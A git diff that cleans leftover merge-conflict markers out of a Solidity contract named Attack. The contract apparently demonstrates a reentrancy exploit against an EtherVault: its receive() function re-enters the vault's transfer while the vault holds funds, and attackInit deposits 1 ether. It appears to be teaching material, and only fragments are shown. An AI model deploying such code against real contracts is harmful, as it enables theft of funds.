@@ -18,13 +18,9 @@ interface IEtherVault {
 } 
 
 contract Attack {
-<<<<<<< HEAD
-
-        event Received(uint256 amount, uint256 balance);
 
 
-=======
->>>>>>> dd2a2cd (Docs: README.md 수정)
+
     IEtherVault public immutable etherVault;
     Attack public attackPeer;
 
@@ -35,11 +31,7 @@ contract Attack {
     function setAttackPeer(Attack _attackPeer) external {
         attackPeer = _attackPeer;
     }
-    
-<<<<<<< HEAD
-      
-=======
->>>>>>> dd2a2cd (Docs: README.md 수정)
+
     receive() external payable {
         if (address(etherVault).balance >= 1 ether) {
             etherVault.transfer(
@@ -48,10 +40,7 @@ contract Attack {
             );
         }
     }
-<<<<<<< HEAD
-=======
 
->>>>>>> dd2a2cd (Docs: README.md 수정)
     function attackInit() external payable {
         require(msg.value == 1 ether, "Require 1 Ether to attack");
         etherVault.deposit{value: 1 ether}();
